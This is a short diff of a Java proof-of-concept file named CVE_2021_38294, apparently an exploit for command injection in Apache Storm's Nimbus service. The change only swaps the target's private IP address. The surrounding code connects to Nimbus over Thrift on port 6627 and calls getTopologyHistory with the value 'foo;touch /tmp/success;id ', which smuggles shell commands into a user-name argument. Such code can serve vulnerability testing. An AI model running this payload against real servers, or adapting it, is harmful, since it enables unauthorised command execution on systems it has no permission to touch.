@@ -21,7 +21,7 @@ public class CVE_2021_38294 {
             config.put("nimbus.thrift.port", 6627);
             config.put("nimbus.thrift.max_buffer_size", 1048576);
             config.put("nimbus.thrift.threads", 64);
-            NimbusClient nimbusClient = new NimbusClient(config, "10.41.230.66", 6627);
+            NimbusClient nimbusClient = new NimbusClient(config, "10.58.120.200", 6627);
             // send attack
             nimbusClient.getClient().getTopologyHistory("foo;touch /tmp/success;id ");
         } catch (Exception e) {
